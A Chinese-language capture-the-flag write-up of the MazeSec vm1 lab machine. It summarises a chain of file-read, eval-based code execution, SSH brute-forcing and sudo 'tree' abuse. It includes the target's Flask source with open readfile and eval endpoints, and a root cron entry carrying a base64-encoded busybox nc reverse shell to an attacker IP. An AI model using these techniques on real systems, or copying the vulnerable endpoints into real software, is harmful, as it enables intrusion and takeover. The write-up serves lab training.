靶机说明

靶机提示：flag 是用户的 ssh 密码

关键词：/proc 进程信息泄露、Python Flask 沙箱逃逸、sudo tree --fromfile 任意文件读取、tree 输出重定向写文件、Cron 定时任务提权

摘要：本文记录了 MazeSec vm1 靶机的渗透过程。选手通过端口扫描发现 9000 端口存在文件读取功能，利用该漏洞读取 /etc/passwd 确认 Docker 容器环境，并通过读取 /proc 目录下各进程的 cmdline 文件定位到容器内运行的 Python Agent 服务；分析源码发现其存在 evalcode 接口，可直接执行任意 Python 代码，借此反弹 Shell 获取 python、php 用户权限并读取对应 flag；利用 busybox nc 构造 HTTP 请求调用 Node.js 服务的 eval 接口，成功读取 node 用户的 flag，拼接得到 SSH 登录密码；通过 Hydra 爆破确定 SSH 用户名为 admin，登录后发现 admin 拥有 sudo 权限执行 tree 命令；最终利用 tree 的 --fromfile 参数既可以读取 /root/root.txt，又可以通过 -o 参数将恶意内容（Crontab 反弹 Shell 或 SSH 公钥）以 root 权限写入系统敏感路径，完成权限提升。该靶机重点考察了 Linux /proc 文件系统信息收集、多语言代码执行漏洞的链式利用以及 sudo 中非常规二进制程序（tree）的权限滥用技巧。

from flask import Flask, request, jsonify
import os
import sys
from io import StringIO

app = Flask(__name__)

@app.route('/process', methods=['POST'])
def process_action():
    try:
        data = request.get_json()
    except:
        return jsonify({'error': 'Invalid JSON input or missing "action" field.'}), 400

    if not data or 'action' not in data:
        return jsonify({'error': 'Invalid JSON input or missing "action" field.'}), 400

    action = data['action']

    if action == 'readfile':
        if 'file' not in data:
            return jsonify({'error': 'Missing "file" parameter for readfile action.'}), 400

        filename = data['file']

        try:
            with open(filename, 'r') as f:
                content = f.read()
                return jsonify({
                    "filename": filename,
                    "content": content
                })
        except FileNotFoundError:
            return jsonify({"error": f"File '{filename}' not found or not readable"}), 404
        except Exception as e:
            return jsonify({
                "error": f"Error reading file: {str(e)}",
                "type": type(e).__name__
            }), 500

    elif action == 'evalcode':
        if 'code' not in data:
            return jsonify({'error': 'Missing "code" parameter for evalcode action.'}), 400

        code_to_eval = data['code']

        old_stdout = sys.stdout
        redirected_output = StringIO()
        sys.stdout = redirected_output

        result = None
        error_type = None
        error_message = None

        try:
            result = eval(code_to_eval)
        except Exception as e:
            error_type = type(e).__name__
            error_message = str(e)
        finally:
            sys.stdout = old_stdout

        captured_output = redirected_output.getvalue()

        if error_type:
            return jsonify({
                "error": f"Code execution error ({error_type}): {error_message}",
                "type": error_type
            }), 500

        return jsonify({
            "code": code_to_eval,
            "result": str(result),
            "output": captured_output,
            "type": str(type(result).__name__)
        })

    else:
        return jsonify({'error': 'Unknown action. Supported actions: readfile, evalcode.'}), 400

if __name__ == '__main__':
    app.run(debug=True, host='127.0.0.1', port=5000)

方案一：写入反弹shell定时任务

写入反弹shell的定时任务到 /etc/cron.d/rootRevShell 文件，注意严格控制内容不能出现 /

└─$ echo '* * * * * root bash -c "echo YnVzeWJveCBuYyAxOTIuMTY4LjYuMTAxIDQ0NDQgLWUgYmFzaAo= | base64 -d | bash"' > '#rootRevShell'

# 使用 -N 避免tree转义文件名中的特殊字符，如果空格
